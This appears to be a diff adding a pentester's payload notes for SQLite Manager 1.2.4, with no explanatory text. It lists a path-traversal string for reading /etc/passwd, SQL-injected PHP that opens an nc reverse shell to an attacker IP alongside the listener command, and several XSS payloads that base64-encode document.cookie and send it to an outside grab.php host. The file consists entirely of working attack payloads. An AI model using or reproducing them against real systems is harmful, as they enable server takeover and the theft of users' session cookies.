@@ -1,0 +1,23 @@
+Version 1.2.4
+
+SQLite Manager-Local File Inclusion
+	../../../../../../../../../../../../../etc/passwd%00;
+
+SQLite Manager-PHP Code Injection
+	CREATE TABLE table1 ( column1 text );
+	INSERT INTO table1 VALUES ('<?php system("which nc"); ?>');
+
+	INSERT INTO table1 VALUES ('<?php system("/bin/nc -e /bin/sh 192.168.204.128 4443"); ?>');
+	
+	(nc -nlvp 4443)
+	
+SQLite Manager-XSS
+	http://192.168.204.130/sqlite/main.php?dbsel="<script>alert(document.cookie)</script>
+	
+	http://192.168.204.130/sqlite/main.php?dbsel="<script>var img=document.createElement('img');img.src='http://192.168.1.58/cookie4/grab.php?cookie='+btoa(document.cookie);</script>
+	
+	<h2 class="sqlmVersion">Database : <a href="main.php?dbsel="<script>var img=document.createElement('img');img.src='http://192.168.1.58/cookie4/grab.php?cookie=' btoa(document.cookie);</script>" style="text-decoration: none;"><span style="color: red;"></span></a></h2>
+	
+	"></a><script>var img=document.createElement('img');img.src='http://192.168.1.58/cookie4/grab.php?cookie='+btoa(document.cookie);</script><script>
+	
+"></a><script>var img=document.createElement('img');img.src='http://192.168.1.58/cookie4/grab.php?cookie='.concat(btoa(document.cookie));</script><script>
